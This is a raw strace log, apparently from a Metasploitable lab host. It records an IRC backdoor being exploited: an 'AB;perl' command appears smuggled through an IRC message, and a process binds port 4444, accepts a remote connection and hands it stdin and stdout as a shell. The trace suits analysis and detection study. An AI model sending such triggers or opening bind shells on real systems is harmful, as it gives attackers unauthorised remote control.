Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10005 07:30:53.766621 close(6)          = 0
10005 07:30:53.766631 munmap(0xb7cf3000, 4096) = 0
10005 07:30:53.766658 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
10005 07:30:53.766679 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeee088) = -1 EINVAL (Invalid argument)
10005 07:30:53.766692 _llseek(6, 0, 0xbfeee0d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10005 07:30:53.766703 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeee088) = -1 EINVAL (Invalid argument)
10005 07:30:53.766713 _llseek(6, 0, 0xbfeee0d0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10005 07:30:53.766723 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
10005 07:30:53.766774 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
10005 07:30:53.766808 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
10005 07:30:53.766832 listen(6, 5)      = 0
10005 07:30:53.766882 accept(6,  <unfinished ...>
10004 07:30:53.772483 exit_group(0)     = ?
10002 07:30:53.772561 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10004
10002 07:30:53.772577 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10002 07:30:53.772589 --- SIGCHLD (Child exited) @ 0 (0) ---
10002 07:30:53.772596 waitpid(-1, 0xbf8e1c58, WNOHANG) = -1 ECHILD (No child processes)
10002 07:30:53.772607 sigreturn()       = ? (mask now [])
10002 07:30:53.772623 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10002 07:30:53.772665 exit_group(0)     = ?
4519  07:30:53.772714 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10002
4519  07:30:53.772754 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:30:53.772769 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:30:53.772797 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:30:53.772807 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:30:53.772828 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:30:53.772891 time(NULL)        = 1495625453
4519  07:30:53.772901 time(NULL)        = 1495625453
4519  07:30:53.772933 gettimeofday({1495625453, 772938}, NULL) = 0
4519  07:30:53.772963 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:30:53.772994 clock_gettime(CLOCK_MONOTONIC, {2263, 590007199}) = 0
4519  07:30:53.773006 gettimeofday({1495625453, 773010}, NULL) = 0
4519  07:30:53.773017 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
10005 07:30:53.871058 <... accept resumed> {sa_family=AF_INET, sin_port=htons(45401), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
10005 07:30:53.871126 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed078) = -1 EINVAL (Invalid argument)
10005 07:30:53.871163 _llseek(8, 0, 0xbfeed0c0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10005 07:30:53.871189 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeed078) = -1 EINVAL (Invalid argument)
10005 07:30:53.871221 _llseek(8, 0, 0xbfeed0c0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10005 07:30:53.871247 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
10005 07:30:53.871295 close(6)          = 0
10005 07:30:53.871385 dup(8)            = 6
10005 07:30:53.871407 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeedf18) = -1 EINVAL (Invalid argument)
10005 07:30:53.871431 _llseek(6, 0, 0xbfeedf60, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10005 07:30:53.871442 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10005 07:30:53.871463 dup2(6, 1)        = 1
10005 07:30:53.871476 close(6)          = 0
10005 07:30:53.871487 fcntl64(1, F_SETFD, 0) = 0
10005 07:30:53.871498 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeedee8) = -1 EINVAL (Invalid argument)
10005 07:30:53.871509 _llseek(1, 0, 0xbfeedf30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10005 07:30:53.871541 dup(8)            = 6
10005 07:30:53.871554 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeedf18) = -1 EINVAL (Invalid argument)
10005 07:30:53.871565 _llseek(6, 0, 0xbfeedf60, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10005 07:30:53.871575 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10005 07:30:53.871601 dup2(6, 0)        = 0
10005 07:30:53.871613 close(6)          = 0
10005 07:30:53.871624 fcntl64(0, F_SETFD, 0) = 0
10005 07:30:53.871638 fcntl64(0, F_SETFD, 0) = 0
10005 07:30:53.871655 read(0, "", 4096) = 0
10005 07:30:54.390018 close(8)          = 0
10005 07:30:54.390183 exit_group(0)     = ?
